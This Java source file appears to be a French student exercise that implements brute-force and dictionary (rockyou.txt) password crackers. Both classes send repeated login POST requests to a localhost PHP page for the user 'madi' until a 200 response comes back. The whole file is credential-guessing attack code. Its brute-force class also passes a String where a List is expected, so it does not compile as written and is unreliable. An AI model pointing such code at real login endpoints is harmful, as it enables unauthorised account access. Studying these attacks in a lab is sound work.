import java.io.*;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public abstract class PasswordCracker {
    public void crackPassword(String password) {
        long startTime = System.currentTimeMillis();

        boolean passwordFound = false;

        try {
            passwordFound = attemptCrack(password);
        } catch (IOException e) {
            e.printStackTrace();
        }

        long endTime = System.currentTimeMillis();
        long executionTime = endTime - startTime;

        if (!passwordFound) {
            System.out.println("Le mot de passe n'a pas été trouvé.");
        }

        System.out.println("Temps de calcul : " + executionTime + " millisecondes");
    }

    protected abstract boolean attemptCrack(String password) throws IOException;
    protected abstract String getPassword() throws IOException, InterruptedException;
}

class BruteForceCracker extends PasswordCracker {
    private boolean passwordFound = false;

    @Override
    protected boolean attemptCrack(String password) {
        generatePasswords("", password.length(), password);
        return passwordFound;
    }

    private void generatePasswords(String prefix, int length, List<String> generatedPasswords) {
    if (length == 0) {
        generatedPasswords.add(prefix); // Ajouter le mot de passe généré à la liste
        return;
    }

    for (char c = 'a'; c <= 'z'; c++) {
        String newPrefix = prefix + c;
        generatePasswords(newPrefix, length - 1, generatedPasswords);
    }
}

    @Override
    protected String getPassword() throws IOException, InterruptedException {
        // client HTTP
        HttpClient client = HttpClient.newHttpClient();

        // URL
        String loginUrl = "http://localhost/TP_PC/verification.php";

        // Données d'identification
        Map<String, String> formData = new HashMap<>();
        formData.put("username", "madi");

        List<String> generatedPasswords = new ArrayList<>();

        for (int length = 1; length <= 4; length++) {
            generatePasswords("", length, generatedPasswords); 
        }

        for (String password : generatedPasswords) {
            formData.put("password", password);

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(loginUrl))
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(buildFormData(formData))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            int statusCode = response.statusCode();
            if (statusCode == 200) {
                return "Authentification réussie 😎!\nLe mot de passe est : " + password;
            }
        }

        return "Malheureusement, nous n'avons pas pu cracker le mot de passe 😔";
    }

    private static HttpRequest.BodyPublisher buildFormData(Map<String, String> data) {
        String formData = data.entrySet().stream()
                .map(entry -> entry.getKey() + "=" + entry.getValue())
                .reduce((param1, param2) -> param1 + "&" + param2)
                .orElse("");
        return HttpRequest.BodyPublishers.ofString(formData);
    }
}

class DictionaryCracker extends PasswordCracker {
    @Override
    protected boolean attemptCrack(String password) throws IOException {
        BufferedReader reader = null;

        try {
            reader = new BufferedReader(new FileReader("C:/Users/Modou/Desktop/Design_paterne-main/src/rockyou.txt"));
            String line;

            while ((line = reader.readLine()) != null) {
                if (line.equals(password)) {
                    System.out.println("Le mot de passe est " + line);
                    return true;
                }
            }
        } finally {
            if (reader != null) {
                reader.close();
            }
        }

        return false;
    }

    // Méthode pour craquer par requête HTTP
    public String getPassword() throws IOException, InterruptedException {
        // Client HTTP
        HttpClient client = HttpClient.newHttpClient();

        // URL
        String loginUrl = "http://localhost/TP_PC/verification.php";

        // Données d'identification
        Map<String, String> formData = new HashMap<>();
        formData.put("username", "madi");

        BufferedReader reader = null;

        try {
            reader = new BufferedReader(new FileReader("C:/Users/Modou/Desktop/Design_paterne-main/src/rockyou.txt"));
            String line;

            while ((line = reader.readLine()) != null) {
                formData.put("password", line);

                // Requête HTTP POST avec les données d'identification
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(loginUrl))
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .POST(buildFormData(formData))
                        .build();

                // Envoi de la requête et récupération de la réponse
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                // Code de retour
                int statusCode = response.statusCode();
                if (statusCode == 200) {
                    // Authentification réussie
                    return "Authentification réussie 😎!\nLe mot de passe était : " + line;
                }
            }
        } finally {
            if (reader != null) {
                reader.close();
            }
        }

        return "Malheureusement, nous n'avons pas pu cracker le mot de passe 😔";
    }

    private static HttpRequest.BodyPublisher buildFormData(Map<String, String> data) {
        String formData = data.entrySet().stream()
                .map(entry -> entry.getKey() + "=" + entry.getValue())
                .reduce((param1, param2) -> param1 + "&" + param2)
                .orElse("");
        return HttpRequest.BodyPublishers.ofString(formData);
    }
}
